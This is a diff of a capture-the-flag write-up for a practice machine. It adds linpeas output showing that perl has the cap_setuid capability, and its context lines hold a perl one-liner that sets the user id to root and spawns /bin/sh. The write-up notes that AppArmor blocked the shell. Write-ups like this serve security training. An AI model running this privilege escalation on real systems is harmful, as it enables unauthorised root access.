@@ -170,15 +170,33 @@ cat user.txt
 3c82****************************
 ```
 
-In my enumeration I found that perl was vulnerable from its capabilities with cap_setuid. However nothing I did was working.
+In my enumeration with linpeas I found that perl was vulnerable from its capabilities with cap_setuid. However nothing I did was working.
 
 https://gtfobins.github.io/gtfobins/perl/
 
+```
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                                
+Current env capabilities:                                                                                                      
+Current: =
+Current proc capabilities:
+CapInh: 0000000000000000
+CapPrm: 0000000000000000
+CapEff: 0000000000000000
+CapBnd: 0000003fffffffff
+CapAmb: 0000000000000000
 
+Parent Shell capabilities:
+0x0000000000000000=
 
+Files with capabilities (limited to 50):
+/usr/bin/perl = cap_setuid+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+```
 
-
-It turns out that it had apparmor enabled as can be seen by this file. Basically we could run ```perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'``` but it would not execute the shell. However changing the command to whoami or id showed that it was running as root.
+It turns out that it had apparmor enabled as can be seen by this file (linpeas also will mention this). Basically we could run ```perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'``` but it would not execute the shell. However changing the command to whoami or id showed that it was running as root.
 
 ```console
 david@nunchucks:/tmp$ cat /etc/apparmor.d/usr.bin.perl
